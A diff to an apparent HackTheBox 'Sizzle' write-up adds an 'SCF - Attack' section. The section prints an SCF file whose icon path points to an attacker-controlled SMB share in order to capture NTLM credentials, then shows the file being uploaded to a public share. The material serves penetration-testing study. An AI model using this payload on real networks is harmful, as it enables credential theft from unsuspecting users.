@@ -105,6 +105,25 @@ What is WinRM ?
 
 Now we can use the cersrv portal and request for Certificate Signing Request (CSR).
 
+#### SCF - Attack
+SCF payload:
+
+```python
+
+➜  sizzle cat steal.scf
+[Shell]
+command=2
+IconFile=\\10.10.14.36\share\pwn.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+upload the SCF file to SMB share
+```python
+
+smb: \Users\public\> put steal.scf
+putting file steal.scf as \Users\public\steal.scf (0.1 kb/s) (average 0.1 kb/s)
+```
+
 #### Certificate Signing Request (CSR)
 We can use OpenSSL to generate CSR file 
 
